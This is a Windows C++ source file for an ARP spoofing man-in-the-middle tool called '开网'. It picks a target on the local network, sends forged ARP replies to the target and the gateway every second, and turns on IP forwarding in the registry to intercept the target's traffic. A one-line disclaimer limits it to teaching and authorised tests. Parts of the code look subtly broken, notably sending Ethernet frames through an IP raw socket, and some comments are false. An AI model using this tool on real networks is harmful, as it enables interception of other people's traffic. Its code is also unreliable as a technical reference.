// kaiwang.cpp —— "开网"：ARP 双向欺骗 + IP 转发中间人（Windows 7 / 10 / 11）
// 本机 IP/MAC 不改动，不会造成 IP 冲突，因此不会把自己搞断网。
// 需要管理员权限。仅供自建网络教学与授权测试使用。
#define _WIN32_WINNT 0x0601            // 目标 Win7 及以上
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>                  // 必须在 iphlpapi.h 之前：MinGW 的 mprapi.h 需要 CERT_NAME_BLOB
#include <ws2tcpip.h>
#include <ws2ipdef.h>                  // SOCKADDR_INET 必须先于 iphlpapi.h（netioapi.h 依赖它）
#include <iphlpapi.h>
#include <shellapi.h>                  // ShellExecuteExA / SHELLEXECUTEINFOA
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

// 链接依赖：MSVC 认识下面这四行；GCC/MinGW 会忽略它们，
// 所以 MinGW 下必须在命令行加 -lws2_32 -liphlpapi -lshell32 -ladvapi32
// （或见 build.bat；Dev-C++ 用户请看 README 的"IDE 里怎么配"一节）。
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// ───────────────────────── 基本常量 ─────────────────────────
static const char* REG_FWD = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters";
static BYTE BROADCAST_MAC[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

static DWORD      g_ifIdx   = 0;          // 本机网卡接口索引
static BYTE       g_myMac[6];             // 本机 MAC
static in_addr    g_myIp    = {};         // 本机 IP
static in_addr    g_gwIp    = {};         // 网关 IP
static BYTE       g_gwMac[6];             // 网关真实 MAC

struct Target { in_addr ip; BYTE mac[6]; };
static Target     g_tg       = {};        // 目标机
static bool       g_isWin7   = false;
static bool       g_cancel   = false;     // Ctrl+C 取消
static HANDLE     g_hStop    = NULL;
static SOCKET     g_poisonSock = INVALID_SOCKET;   // Ctrl+C / 关窗时收尾要用
static std::string g_fwdSaved;            // 以下：注册表原值快照，恢复时照原样放回
static bool       g_fwdExisted = false, g_icsExisted = false, g_icmpExisted = false;
static std::string g_icsSaved, g_icmpSaved;
static DWORD      g_fwdNum = 0, g_icsNum = 0, g_icmpNum = 0;
static bool       g_fwdIsNum = false, g_icsIsNum = false, g_icmpIsNum = false;

// ───────────────────────── 小工具 ─────────────────────────
static std::string mac2s(const BYTE* m) {
    char b[18];
    sprintf(b, "%02X-%02X-%02X-%02X-%02X-%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
    return b;
}
static const char* ip2s(in_addr a) { static char b[64][24]; static int i = 0; i = (i + 1) % 64;
    InetNtopA(AF_INET, &a, b[i], 24); return b[i]; }
static in_addr ip4(const char* s) { in_addr a; a.s_addr = inet_addr(s); return a; }
static bool ipBad(in_addr a) { return a.s_addr == INADDR_NONE; }

// ───────────────────────── 管理员权限 ─────────────────────────
static bool isAdmin() {
    BOOL ok = FALSE; PSID sid = NULL;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                 0, 0, 0, 0, 0, 0, &sid)) {
        CheckTokenMembership(NULL, sid, &ok);
        FreeSid(sid);
    }
    return ok != FALSE;
}
static bool relaunchAsAdmin() {
    char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, MAX_PATH);
    SHELLEXECUTEINFOA si = { sizeof(si) };
    si.lpVerb = "runas"; si.lpFile = exe; si.nShow = SW_SHOWNORMAL;
    if (ShellExecuteExA(&si)) return true;
    printf("[!] 提权失败或被拒绝，请右键“以管理员身份运行”。\n");
    return false;
}

// ───────────────────────── 网卡 / IP 信息 ─────────────────────────
static bool pickAdapter() {
    ULONG sz = 16 * 1024;
    PIP_ADAPTER_INFO ai = (PIP_ADAPTER_INFO)malloc(sz);
    if (GetAdaptersInfo(ai, &sz) != ERROR_SUCCESS) { free(ai); return false; }

    PIP_ADAPTER_INFO best = NULL;
    for (PIP_ADAPTER_INFO p = ai; p; p = p->Next) {
        if (p->Type == MIB_IF_TYPE_LOOPBACK) continue;
        IP_ADDR_STRING* s = &p->IpAddressList;
        if (!s->IpAddress.String[0] || strcmp(s->IpAddress.String, "0.0.0.0") == 0) continue;
        if (!best) best = p;                                  // 退路：第一个有 IP 的
        if (inet_addr(s->IpAddress.String) == inet_addr("192.168.0.108")) { best = p; break; }
        if (strncmp(s->IpAddress.String, "192.168.", 8) == 0 ||   // 优先内网地址
            strncmp(s->IpAddress.String, "10.", 3) == 0 ||
            strncmp(s->IpAddress.String, "172.", 4) == 0) best = p;
    }
    if (!best) { free(ai); return false; }

    g_ifIdx = best->Index;
    memcpy(g_myMac, best->Address, 6);
    g_myIp = ip4(best->IpAddressList.IpAddress.String);
    g_gwIp = ip4(best->GatewayList.IpAddress.String);
    free(ai);
    return g_ifIdx != 0 && !ipBad(g_myIp);
}

// 取某 IP 的真实 MAC：先查本机 ARP 表（含静态项），再主动询问
static bool macOf(in_addr ip, BYTE* out) {
    if (ip.s_addr == g_myIp.s_addr) { memcpy(out, g_myMac, 6); return true; }

    // 1) 已解析的邻居（GetIpNetTable2 自 Vista/Win7 起可用，避开 Win10 专属接口）
    ULONG sz = 0;
    PMIB_IPNET_TABLE2 tb = NULL;
    if (GetIpNetTable2(AF_INET, &tb) == NO_ERROR && tb) {
        for (ULONG i = 0; i < tb->NumEntries; ++i) {
            MIB_IPNET_ROW2& r = tb->Table[i];
            if (r.Address.si_family == AF_INET && r.Address.Ipv4.sin_addr.s_addr == ip.s_addr &&
                r.PhysicalAddressLength == 6) {
                memcpy(out, r.PhysicalAddress, 6); FreeMibTable(tb); return true;
            }
        }
    }
    if (tb) FreeMibTable(tb);

    // 2) 主动 ARP 询问（会自动发包并写入上行 ARP 缓存）
    ULONG mac[2] = { 0, 0 }, len = 6;
    if (SendARP(ip.s_addr, 0, mac, &len) == NO_ERROR && len == 6) {
        BYTE* p = (BYTE*)mac;
        bool zero = true; for (int i = 0; i < 6; ++i) if (p[i]) zero = false;
        if (!zero) { memcpy(out, p, 6); return true; }
    }
    return false;
}
static bool gatewayMac() { return macOf(g_gwIp, g_gwMac); }

// ───────────────────────── ARP 伪造包 ─────────────────────────
static bool sendArp(SOCKET s, in_addr srcIp, const BYTE* srcMac, in_addr dstIp, const BYTE* dstMac) {
    BYTE pkt[42] = {};
    memcpy(pkt + 0, dstMac, 6);
    memcpy(pkt + 6, srcMac, 6);
    pkt[12] = 0x08; pkt[13] = 0x06;                 // ARP
    pkt[14] = 0x00; pkt[15] = 0x01;                 // 以太网
    pkt[16] = 0x08; pkt[17] = 0x00;                 // IPv4
    pkt[18] = 6;    pkt[19] = 4;
    pkt[20] = 0x00; pkt[21] = 0x02;                 // opcode = reply（单播伪造）
    memcpy(pkt + 22, srcMac, 6);
    memcpy(pkt + 28, &srcIp, 4);
    memcpy(pkt + 32, dstMac, 6);
    memcpy(pkt + 38, &dstIp, 4);

    SOCKADDR_IN d = {}; d.sin_family = AF_INET; d.sin_port = htons(0);
    d.sin_addr.s_addr = INADDR_BROADCAST;           // 直接广播：本网段所有机器都能收到
    return sendto(s, (char*)pkt, 42, 0, (SOCKADDR*)&d, sizeof(d)) == 42;
}

// 双向投毒：让 目标 认为"网关的 MAC 是本机"，让 网关 认为"目标的 MAC 是本机"
static int poison(SOCKET s) {
    int n = 0;
    if (sendArp(s, g_gwIp, g_myMac, g_tg.ip, g_tg.mac))            ++n;  // 骗目标
    if (sendArp(s, g_tg.ip, g_myMac, g_gwIp, g_gwMac))             ++n;  // 骗网关
    return n;
}
// 收尾：把正确映射发回去，让双方 ARP 表恢复
static int heal(SOCKET s) {
    int n = 0;
    for (int i = 0; i < 5; ++i) {
        if (sendArp(s, g_gwIp, g_gwMac, g_tg.ip, g_tg.mac))        ++n;
        if (sendArp(s, g_tg.ip, g_tg.mac, g_gwIp, g_gwMac))        ++n;
        Sleep(60);
    }
    return n;
}

// ───────────────────────── IP 转发（注册表） ─────────────────────────
static bool regReadStr(HKEY k, const char* name, std::string& out) {
    char buf[64]; DWORD sz = sizeof(buf), type = 0;
    if (RegQueryValueExA(k, name, NULL, &type, (LPBYTE)buf, &sz) != ERROR_SUCCESS) return false;
    if (type != REG_SZ) return false;
    buf[sz < sizeof(buf) ? sz : sizeof(buf) - 1] = 0;
    out = buf; return true;
}
static bool regWriteStr(HKEY k, const char* name, const char* val) {
    return RegSetValueExA(k, name, 0, REG_SZ, (const BYTE*)val, (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
}

// 记住原值：原先没有的键，恢复时要删掉，而不是写个 0 进去
static void snapValue(HKEY k, const char* name, bool& existed, bool& isNum,
                      DWORD& num, std::string& str) {
    DWORD type = 0, sz = sizeof(DWORD), d = 0;
    if (RegQueryValueExA(k, name, NULL, &type, (LPBYTE)&d, &sz) == ERROR_SUCCESS && type == REG_DWORD) {
        existed = true; isNum = true; num = d; return;
    }
    if (regReadStr(k, name, str)) { existed = true; isNum = false; return; }
    existed = false;
}

// Win7 用 IPEnableRouter；Win10/11 以它为主，并补 InternetConnectionSharing
static void enableForwarding() {
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, REG_FWD, 0, KEY_ALL_ACCESS, &k) != ERROR_SUCCESS) {
        printf("[!] 无法打开转发注册表项（错误 %lu），IP 转发未开启。\n", GetLastError());
        return;
    }
    snapValue(k, "IPEnableRouter",           g_fwdExisted,  g_fwdIsNum,  g_fwdNum,  g_fwdSaved);
    snapValue(k, "InternetConnectionSharing", g_icsExisted, g_icsIsNum,  g_icsNum,  g_icsSaved);
    snapValue(k, "EnableICMPRedirect",       g_icmpExisted, g_icmpIsNum, g_icmpNum, g_icmpSaved);

    regWriteStr(k, "IPEnableRouter", "1");
    if (!g_isWin7) regWriteStr(k, "InternetConnectionSharing", "1");
    RegCloseKey(k);
    printf("[+] IP 转发已开启（原值：%s）\n",
           g_fwdExisted ? (g_fwdIsNum ? (g_fwdNum ? "1" : "0") : g_fwdSaved.c_str()) : "未设置");
}
// 还原转发设置：严格照原样回写，不带任何额外改动
static void restoreForwarding() {
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, REG_FWD, 0, KEY_ALL_ACCESS, &k) != ERROR_SUCCESS) {
        printf("[!] 无法还原转发设置，请手动把 IPEnableRouter 改回 0。\n"); return;
    }
    struct Item { const char* name; bool existed; bool isNum; DWORD num; const std::string* str; bool touched; };
    Item items[3] = {
        { "IPEnableRouter",            g_fwdExisted,  g_fwdIsNum,  g_fwdNum,  &g_fwdSaved,  true  },
        { "InternetConnectionSharing", g_icsExisted,  g_icsIsNum,  g_icsNum,  &g_icsSaved,  !g_isWin7 },
        { "EnableICMPRedirect",        g_icmpExisted, g_icmpIsNum, g_icmpNum, &g_icmpSaved, false },
    };
    for (int i = 0; i < 3; ++i) {
        if (!items[i].touched) continue;              // 本次运行没碰过的键，不动它
        if (!items[i].existed) { RegDeleteValueA(k, items[i].name); continue; }
        if (items[i].isNum)
            RegSetValueExA(k, items[i].name, 0, REG_DWORD, (const BYTE*)&items[i].num, sizeof(DWORD));
        else
            regWriteStr(k, items[i].name, items[i].str->c_str());
    }
    RegCloseKey(k);
    printf("[+] IP 转发设置已还原（严格按照原值，未留下多余改动）。\n");
}

// ───────────────────────── 收尾 ─────────────────────────
static void restoreAll(SOCKET s) {
    printf("\n[*] 正在恢复……\n");
    if (s != INVALID_SOCKET) {
        int n = heal(s);
        printf("[+] 已向目标与网关发回 %d 个正确 ARP 应答。\n", n);
    }
    restoreForwarding();
    printf("[+] 目标 %s 与网关 %s 已恢复正常通信。\n", ip2s(g_tg.ip), ip2s(g_gwIp));
    printf("[+] 可以直接关闭本程序了。\n");
}
static BOOL WINAPI onCtrlC(DWORD) { g_cancel = true; if (g_hStop) SetEvent(g_hStop); return TRUE; }

// 点窗口右上角 × 关闭时，也要走恢复流程
static BOOL WINAPI onClose(DWORD type) {
    if (type == CTRL_CLOSE_EVENT || type == CTRL_LOGOFF_EVENT || type == CTRL_SHUTDOWN_EVENT) {
        g_cancel = true;
        if (g_hStop) SetEvent(g_hStop);
        if (g_poisonSock != INVALID_SOCKET) { heal(g_poisonSock); restoreForwarding(); }
        printf("\n[+] 已恢复设置，可以关闭了。\n");
        return TRUE;
    }
    return FALSE;
}

// ───────────────────────── 主流程 ─────────────────────────
static void listArpTable() {
    printf("── 本机 ARP 表中的在线机器（网关已置顶） ──────────────\n");
    system("arp -a");
    printf("───────────────────────────────────────────────────────\n");
}

// 控制台初始化：UTF-8 编码 + 等宽字体（不改配色，保持系统默认的黑底白字）
static void setupConsole() {
    SetConsoleOutputCP(65001);                     // 本源码是 UTF-8，控制台也按 UTF-8 解码
    SetConsoleCP(65001);
    setvbuf(stdout, NULL, _IONBF, 0);              // 关掉 stdout 缓冲，避免重定向时输出错位
    // 换成 TrueType 等宽字体，否则老系统上中文可能显示成方块
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_FONT_INFOEX cfi; cfi.cbSize = sizeof(cfi);
    if (GetCurrentConsoleFontEx(h, FALSE, &cfi)) {
        wcscpy(cfi.FaceName, L"Consolas");          // Win7/10/11 都自带，且支持中文
        cfi.dwFontSize.Y = 16;
        SetCurrentConsoleFontEx(h, FALSE, &cfi);
    }
}

int main() {
    setupConsole();
    SetConsoleTitleA("开网 - ARP 中间人工具");
    if (!isAdmin()) { if (relaunchAsAdmin()) return 0; system("pause"); return 1; }

    // 精确判断是否 Win7（6.1）
    OSVERSIONINFOEXA os = { sizeof(os) };
    os.dwMajorVersion = 6; os.dwMinorVersion = 1;
    DWORDLONG mask = 0; VER_SET_CONDITION(mask, VER_MINORVERSION, VER_EQUAL);
    g_isWin7 = VerifyVersionInfoA(&os, VER_MINORVERSION, mask) != FALSE;

    printf("=======================================================\n");
    printf("                开 网  /  ARP 中间人\n");
    printf("      适配 Windows %s（转发参数按系统版本自动匹配）\n", g_isWin7 ? "7" : "10 / 11");
    printf("=======================================================\n\n");

    if (!pickAdapter() || !gatewayMac()) {
        printf("[!] 未找到可用网卡或网关，请检查网络连接。\n"); system("pause"); return 1;
    }
    printf("[*] 本机网卡 : %s  (MAC %s)\n", ip2s(g_myIp), mac2s(g_myMac).c_str());
    printf("[*] 网   关 : %s  (MAC %s)\n\n", ip2s(g_gwIp), mac2s(g_gwMac).c_str());

    listArpTable();

    char line[128] = {};
    printf("请输入要“代替”哪一台电脑（目标 IP，直接回车退出）：");
    if (!fgets(line, sizeof(line), stdin)) return 0;
    line[strcspn(line, "\r\n")] = 0;
    if (!line[0]) return 0;

    g_tg.ip = ip4(line);
    if (ipBad(g_tg.ip)) { printf("[!] IP 格式不正确。\n"); system("pause"); return 1; }
    if (g_tg.ip.s_addr == g_myIp.s_addr) { printf("[!] 不能选本机。\n"); system("pause"); return 1; }

    if (!macOf(g_tg.ip, g_tg.mac)) {
        printf("[!] 拿不到 %s 的 MAC：该机不在线或与你不通。\n", line);
        printf("    可先 ping %s 一下再重试。\n", line);
        system("pause"); return 1;
    }
    printf("[*] 目标机   : %s  (MAC %s)\n\n", ip2s(g_tg.ip), mac2s(g_tg.mac).c_str());

    printf("确认代替这台电脑？流量将经本机中转。[y/N] ");
    if (!fgets(line, sizeof(line), stdin)) return 0;
    if (line[0] != 'y' && line[0] != 'Y') { printf("已取消。\n"); return 0; }

    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s == INVALID_SOCKET) {
        printf("[!] 创建原始套接字失败（错误 %lu），请确认以管理员运行。\n", GetLastError());
        system("pause"); return 1;
    }
    BOOL on = TRUE;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&on, sizeof(on));   // 绕过本机网关校验，直发广播帧

    g_poisonSock = s;
    enableForwarding();
    SetConsoleCtrlHandler(onCtrlC, TRUE);
    SetConsoleCtrlHandler(onClose, TRUE);       // 点 × 关窗也能恢复
    g_hStop = CreateEventA(NULL, TRUE, FALSE, NULL);

    printf("\n[+] 开始欺骗，每 1 秒重发一次 ARP ……（按 Ctrl+C 或关闭窗口即恢复）\n\n");
    while (!g_cancel) {
        poison(s);
        WaitForSingleObject(g_hStop, 1000);
    }

    restoreAll(s);
    closesocket(s); WSACleanup();
    printf("\n按任意键退出……\n");
    system("pause >nul");
    return 0;
}
